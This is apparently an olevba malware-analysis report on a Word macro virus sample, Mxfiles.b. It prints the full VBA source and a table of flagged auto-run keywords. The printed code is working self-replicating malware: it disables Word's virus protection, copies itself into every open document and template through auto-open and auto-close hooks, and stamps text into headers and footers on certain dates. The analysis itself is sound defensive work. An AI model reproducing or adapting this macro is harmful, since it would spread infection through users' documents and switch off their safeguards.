olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mxfiles.b-1b7444564f10a94f3a0084bfbafeb0814c8d1b89
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mxfiles.b-1b7444564f10a94f3a0084bfbafeb0814c8d1b89 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Mxfile.bas 
in file: Virus.MSWord.Mxfiles.b-1b7444564f10a94f3a0084bfbafeb0814c8d1b89 - OLE stream: 'Macros/VBA/Mxfile'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub ToolsMacro()
Mxfiles
End Sub
Sub Autoexit()
Mxfiles
End Sub
Sub Autoexec()
Mxfiles
End Sub
Sub Autonew()
Mxfiles
End Sub
Sub Autoopen()
Mxfiles
End Sub
Sub Autoclose()
Mxfiles
End Sub
Sub Openshell()
Mxfiles
End Sub
Sub Mxfiles()
'this is demo for Sk virus ,it do not make any thing
On Error Resume Next
Options.VirusProtection = False
ddorg = ThisDocument.FullName
For a = 1 To Documents.Count
If Documents.Item(a).Path <> "" Then
dest = Documents.Item(a).FullName
SetAttr dest, vbNormal
Else
dest = Documents.Item(a).Name
End If
If ddorg <> dest Then
Application.OrganizerCopy Source:=ddorg, Destination:=dest, Name:="Mxfile", Object:=wdOrganizerObjectProjectItems
If Documents.Item(a).Path <> "" Then
Documents.Item(a).Save
End If
End If
dd = Documents.Item(a).AttachedTemplate
dd1 = Options.DefaultFilePath(Path:=wdUserTemplatesPath)
dd2 = dd1 + "\" + dd
SetAttr dd2, vbNormal
If ddorg <> dd2 Then
Application.OrganizerCopy Source:=ddorg, Destination:=dd2, Name:="Mxfile", Object:=wdOrganizerObjectProjectItems
End If
SetAttr dd2, vbReadOnly
Next a
dayn = Format(Date, "dd")
monthn = Format(Date, "mm")
reg = dayn Mod monthn
If reg = 0 Then
txt = "ßáäÇ äÈÇíÚ ãÈÇÑß"
 ActiveWindow.ActivePane.View.SeekView = wdSeekCurrentPageHeader
  Selection.EndKey Unit:=wdLine, Extend:=wdExtend
  Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
  Selection.TypeText Text:=txt
  ActiveWindow.ActivePane.View.SeekView = wdSeekCurrentPageFooter
  Selection.EndKey Unit:=wdLine, Extend:=wdExtend
  Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
  Selection.TypeText Text:=txt + "                               Sk"
  ActiveWindow.ActivePane.View.SeekView = wdSeekMainDocument
End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |Autoopen            |Runs when the Word document is opened        |
|AutoExec  |Autoexit            |Runs when the Word document is closed        |
|AutoExec  |Autoclose           |Runs when the Word document is closed        |
|AutoExec  |Autonew             |Runs when a new Word document is created     |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
+----------+--------------------+---------------------------------------------+

